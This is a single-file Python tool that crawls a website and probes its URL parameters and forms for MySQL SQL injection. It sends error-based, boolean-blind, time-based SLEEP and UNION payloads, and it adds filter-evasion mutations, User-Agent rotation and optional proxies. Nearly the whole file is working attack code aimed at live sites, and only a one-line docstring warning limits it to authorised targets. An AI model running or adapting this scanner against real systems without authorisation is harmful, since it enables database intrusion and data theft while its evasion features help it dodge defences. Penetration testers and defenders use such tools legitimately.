#!/usr/bin/env python3
"""
mysql_sqli_scanner.py
Single-file improved crawler + MySQL-only SQLi scanner.

Features:
- Crawl same-domain links (A tags), dedupe, follow depth limit
- Extract parameterized URLs (?id=1) and HTML forms (POST/GET)
- Test error-based, boolean-based, time-based (MySQL SLEEP), union-based SQLi
- Simple WAF-evasion payload mutations (inline comments, hex-encoding)
- User-Agent rotation, optional proxies, multi-threaded scanning
- Output JSON & CSV results
- No ML/NLP. Focus: MySQL only.

Usage:
    python mysql_sqli_scanner.py --start-url https://example.com --max-depth 2

Only test targets you are authorized to scan.
"""
import re
import sys
import time
import json
import csv
import argparse
import random
import threading
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from bs4 import BeautifulSoup

# -------------------------
# Config / Payloads
# -------------------------
DEFAULT_HEADERS = [
    # A few UA strings to rotate
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15"
]

# MySQL specific payloads grouped by technique
PAYLOADS = {
    "error": ["'", "\"'"],  # cause SQL syntax error -> look for MySQL errors
    "boolean_true": [" AND 1=1", "\" AND 1=1 -- "],
    "boolean_false": [" AND 1=2", "\" AND 1=2 -- "],
    "time": [" AND IF(1=1, SLEEP({delay}), 0) -- ", " AND IF(1=2, SLEEP({delay}), 0) -- "],  # format delay
    "union": [" UNION SELECT {cols} -- "],  # {cols} replaced with NULLs
}

# MySQL error regex patterns (common)
MYSQL_ERROR_PATTERNS = [
    re.compile(r"You have an error in your SQL syntax", re.I),
    re.compile(r"mysql_fetch_assoc\(", re.I),
    re.compile(r"Warning: mysql_", re.I),
    re.compile(r"Unclosed quotation mark after the character string", re.I),
    re.compile(r"error in your SQL syntax near", re.I),
]

# Small helper: WAF-evasion mutations
def mutate_payload(payload):
    """
    Return a small list of mutated payloads to try to bypass simple filters.
    - inline comments to break keywords
    - hex-encode common strings (e.g., 'admin' -> 0x61646d696e)
    """
    muts = [payload]
    # inline comment variant (e.g., UNI/**/ON SELECT)
    muts.append(payload.replace("UNION", "UN/**/ION").replace("union", "un/**/ion"))
    # case shuffle
    muts.append(''.join([c.upper() if i % 2 else c for i, c in enumerate(payload)]))
    return list(dict.fromkeys(muts))

# -------------------------
# Scanner / Crawler Class
# -------------------------
class MySQLScanner:
    def __init__(self, start_url, max_depth=2, max_workers=10, delay=0.5, timeout=10, proxies=None, user_agents=None):
        self.start_url = start_url.rstrip('/')
        self.domain = urlparse(self.start_url).netloc
        self.scheme = urlparse(self.start_url).scheme
        self.max_depth = max_depth
        self.visited = set()
        self.to_visit = []
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.timeout = timeout
        self.delay = delay
        self.proxies = proxies or []
        self.user_agents = user_agents or DEFAULT_HEADERS
        self.results = []  # list of dicts
        self.max_workers = max_workers

    # -------------------------
    # CRAWLER
    # -------------------------
    def crawl(self):
        print(f"[+] Starting crawl: {self.start_url} (domain: {self.domain})")
        self.to_visit.append((self.start_url, 0))
        while self.to_visit:
            url, depth = self.to_visit.pop(0)
            if depth > self.max_depth:
                continue
            if url in self.visited:
                continue
            try:
                resp = self._get(url)
            except Exception as e:
                print(f"[-] Error fetching {url}: {e}")
                self.visited.add(url)
                continue
            self.visited.add(url)
            # parse links
            if 'text/html' in resp.headers.get('Content-Type', ''):
                self._extract_links(resp.text, url, depth)
            time.sleep(self.delay)

    def _extract_links(self, html, base_url, depth):
        soup = BeautifulSoup(html, "html.parser")
        # A tags
        for a in soup.find_all('a', href=True):
            href = a['href'].strip()
            if href.startswith('javascript:') or href.startswith('mailto:'):
                continue
            absolute = urljoin(base_url, href)
            parsed = urlparse(absolute)
            if parsed.netloc == self.domain:  # same domain only
                normalized = parsed._replace(fragment='').geturl()
                if normalized not in self.visited:
                    self.to_visit.append((normalized, depth + 1))
        # forms (we include form action endpoints for later testing)
        for form in soup.find_all('form'):
            action = form.get('action') or base_url
            absolute = urljoin(base_url, action)
            parsed = urlparse(absolute)
            if parsed.netloc == self.domain:
                normalized = parsed._replace(fragment='').geturl()
                if normalized not in self.visited:
                    self.to_visit.append((normalized, depth + 1))

    def _get(self, url, params=None, data=None, headers=None, use_proxy=False):
        headers = headers or {}
        headers['User-Agent'] = random.choice(self.user_agents)
        proxy = None
        if use_proxy and self.proxies:
            proxy = random.choice(self.proxies)
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = self.session.get(url, params=params, headers=headers, timeout=self.timeout, proxies=proxies, allow_redirects=True)
        return resp

    def _post(self, url, data=None, headers=None, use_proxy=False):
        headers = headers or {}
        headers['User-Agent'] = random.choice(self.user_agents)
        proxy = None
        if use_proxy and self.proxies:
            proxy = random.choice(self.proxies)
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = self.session.post(url, data=data, headers=headers, timeout=self.timeout, proxies=proxies, allow_redirects=True)
        return resp

    # -------------------------
    # TESTING / INJECTION LOGIC
    # -------------------------
    def discover_targets(self):
        """
        From visited URLs, extract parameterized GET URLs and simple form endpoints for POST.
        Returns list of dicts: {'type':'GET'/'POST', 'url':..., 'params': dict or list of input names}
        """
        targets = []
        for url in self.visited:
            parsed = urlparse(url)
            qs = parsed.query
            if qs:
                # parse params and store as dict of param->value (keep sample values)
                params = {k: v[0] if isinstance(v, list) else v for k, v in parse_qs(qs).items()}
                clean_url = parsed._replace(query='').geturl()
                targets.append({'type': 'GET', 'url': clean_url, 'params': params})
            else:
                # We will also attempt to fetch page and detect forms
                try:
                    resp = self._get(url)
                except Exception:
                    continue
                soup = BeautifulSoup(resp.text, "html.parser")
                for form in soup.find_all('form'):
                    method = (form.get('method') or 'get').lower()
                    action = form.get('action') or url
                    absolute = urljoin(url, action)
                    inputs = {}
                    for inp in form.find_all(['input', 'textarea', 'select']):
                        name = inp.get('name')
                        if not name:
                            continue
                        # default sample value
                        value = inp.get('value') or 'test'
                        inputs[name] = value
                    targets.append({'type': method.upper(), 'url': absolute, 'params': inputs})
        # dedupe by url+sorted param keys
        unique = {}
        for t in targets:
            key = (t['type'], t['url'], tuple(sorted(t['params'].keys())))
            if key not in unique:
                unique[key] = t
        return list(unique.values())

    def test_target(self, target):
        """
        Test a single target (GET or POST) for MySQL SQLi (error/boolean/time/union).
        Append findings to self.results.
        """
        base_type = target['type']
        base_url = target['url']
        params = target['params'].copy()
        print(f"[+] Testing {base_type} {base_url} params={list(params.keys())}")
        baseline_resp = None
        try:
            if base_type == 'GET':
                baseline_resp = self._get(base_url, params=params)
            else:
                baseline_resp = self._post(base_url, data=params)
        except Exception as e:
            print(f"[-] Could not fetch baseline for {base_url}: {e}")
            return

        baseline_text = baseline_resp.text
        baseline_len = len(baseline_text)

        # Helper to record a finding
        def record(technique, injected_param, payload, evidence=None, details=None):
            entry = {
                "url": base_url,
                "type": base_type,
                "param": injected_param,
                "technique": technique,
                "payload": payload,
                "evidence": evidence,
                "details": details,
            }
            with self.lock:
                self.results.append(entry)
            print(f"[!] VULN {technique} -> {base_url} param={injected_param} payload={payload}")

        # 1) ERROR-BASED: append a single quote or quote-variation to each param and look for MySQL errors
        for p in list(params.keys()):
            original = params[p]
            for pay in PAYLOADS['error']:
                mutated_list = mutate_payload(pay)
                for payload_variant in mutated_list:
                    params[p] = original + payload_variant
                    try:
                        resp = self._get(base_url, params=params) if base_type == 'GET' else self._post(base_url, data=params)
                    except Exception:
                        continue
                    txt = resp.text
                    # check known MySQL error strings
                    for pat in MYSQL_ERROR_PATTERNS:
                        if pat.search(txt):
                            record("error-based", p, payload_variant, evidence=pat.pattern)
                            break
                    params[p] = original

        # 2) BOOLEAN-BASED (blind): inject AND 1=1 vs AND 1=2 and compare page length/content
        for p in list(params.keys()):
            orig = params[p]
            # true injection
            t_payloads = mutate_payload(PAYLOADS['boolean_true'][0])
            f_payloads = mutate_payload(PAYLOADS['boolean_false'][0])
            # try multiple variants
            for t_p, f_p in zip(t_payloads, f_payloads):
                params[p] = orig + t_p
                try:
                    rt = self._get(base_url, params=params) if base_type == 'GET' else self._post(base_url, data=params)
                except Exception:
                    continue
                params[p] = orig + f_p
                try:
                    rf = self._get(base_url, params=params) if base_type == 'GET' else self._post(base_url, data=params)
                except Exception:
                    params[p] = orig
                    continue
                params[p] = orig
                # compare
                if rt.status_code == rf.status_code:
                    # significant content difference indicates possible boolean blind
                    if abs(len(rt.text) - len(rf.text)) > max(50, 0.02 * baseline_len) or (rt.text.strip() != rf.text.strip()):
                        record("boolean-blind", p, f"{t_p} / {f_p}", evidence=f"len_true={len(rt.text)} len_false={len(rf.text)}")
                        break

        # 3) TIME-BASED (MySQL SLEEP): use IF(condition, SLEEP(delay), 0)
        # We will attempt a small delay (e.g., 5s) and measure response time
        delay_sec = 5
        for p in list(params.keys()):
            orig = params[p]
            payload_template = PAYLOADS['time'][0]  # " AND IF(1=1, SLEEP({delay}), 0) -- "
            pay_true = payload_template.format(delay=delay_sec)
            pay_false = PAYLOADS['time'][1].format(delay=delay_sec)  # IF(1=2, SLEEP(delay),0)
            mutated_true = mutate_payload(pay_true)[0]
            mutated_false = mutate_payload(pay_false)[0]
            params[p] = orig + mutated_false
            try:
                start = time.time()
                _ = self._get(base_url, params=params) if base_type == 'GET' else self._post(base_url, data=params)
                t_false = time.time() - start
            except Exception:
                params[p] = orig
                continue
            params[p] = orig + mutated_true
            try:
                start = time.time()
                _ = self._get(base_url, params=params) if base_type == 'GET' else self._post(base_url, data=params)
                t_true = time.time() - start
            except Exception:
                params[p] = orig
                continue
            params[p] = orig
            if t_true - t_false > (delay_sec - 1):  # allow some network jitter tolerance
                record("time-based-blind", p, mutated_true, evidence=f"t_true={t_true:.1f}s t_false={t_false:.1f}s")

        # 4) UNION-BASED (basic): try to discover column count by incrementing NULLs
        # Only attempt union for GET with a numeric parameter or present in baseline
        for p in list(params.keys()):
            orig = params[p]
            # quick heuristic: param value is numeric or contains digits
            if not re.search(r"\d", str(orig)):
                # still try but prefix with '1' to attempt numeric union
                seed = "1"
            else:
                seed = orig
            max_cols = 8
            found_union = False
            for cols in range(1, max_cols + 1):
                nulls = ",".join(["NULL"] * cols)
                union_payload = PAYLOADS['union'][0].format(cols=nulls)
                mutated_list = mutate_payload(union_payload)
                for mp in mutated_list:
                    # try by appending to the parameter
                    params[p] = seed + mp
                    try:
                        r = self._get(base_url, params=params) if base_type == 'GET' else self._post(base_url, data=params)
                    except Exception:
                        continue
                    # If the page differs significantly (or shows no SQL error but content changed), suspect union injection success
                    if r.status_code == 200 and len(r.text) > baseline_len + 20:
                        record("union-based", p, mp, evidence=f"cols={cols} len={len(r.text)}")
                        found_union = True
                        break
                params[p] = orig
                if found_union:
                    break

    # -------------------------
    # RUN
    # -------------------------
    def run(self):
        # 1) Crawl
        self.crawl()
        # 2) Discover targets
        targets = self.discover_targets()
        print(f"[+] Discovered {len(targets)} unique targets (GET/POST endpoints) to test.")
        # 3) Multi-threaded test
        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = [ex.submit(self.test_target, t) for t in targets]
            for fut in as_completed(futures):
                pass
        print(f"[+] Scan finished. {len(self.results)} possible findings recorded.")

    def export_results(self, out_prefix="scan_results"):
        timestamp = int(time.time())
        json_path = f"{out_prefix}_{timestamp}.json"
        csv_path = f"{out_prefix}_{timestamp}.csv"
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=2)
        # CSV
        keys = ["url", "type", "param", "technique", "payload", "evidence", "details"]
        with open(csv_path, "w", newline='', encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=keys)
            writer.writeheader()
            for row in self.results:
                writer.writerow({k: row.get(k, "") for k in keys})
        print(f"[+] Results exported: {json_path}, {csv_path}")
        return json_path, csv_path

# -------------------------
# CLI
# -------------------------
def parse_args():
    ap = argparse.ArgumentParser(description="MySQL-only crawler + SQLi scanner (single-file).")
    ap.add_argument("--start-url", "-u", required=True, help="Start URL (same domain crawl).")
    ap.add_argument("--max-depth", type=int, default=2, help="Crawl depth (default 2).")
    ap.add_argument("--workers", type=int, default=8, help="Concurrency workers for testing.")
    ap.add_argument("--delay", type=float, default=0.3, help="Delay between crawl requests (seconds).")
    ap.add_argument("--timeout", type=int, default=10, help="HTTP timeout seconds.")
    ap.add_argument("--proxy-file", help="Optional file with proxy URLs (one per line).")
    ap.add_argument("--user-agent-file", help="Optional file with User-Agent strings (one per line).")
    return ap.parse_args()

def load_list_file(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception:
        return []

def main():
    args = parse_args()
    proxies = load_list_file(args.proxy_file) if args.proxy_file else []
    uas = load_list_file(args.user_agent_file) if args.user_agent_file else DEFAULT_HEADERS
    scanner = MySQLScanner(
        start_url=args.start_url,
        max_depth=args.max_depth,
        max_workers=args.workers,
        delay=args.delay,
        timeout=args.timeout,
        proxies=proxies,
        user_agents=uas
    )
    scanner.run()
    scanner.export_results()

if __name__ == "__main__":
    main()
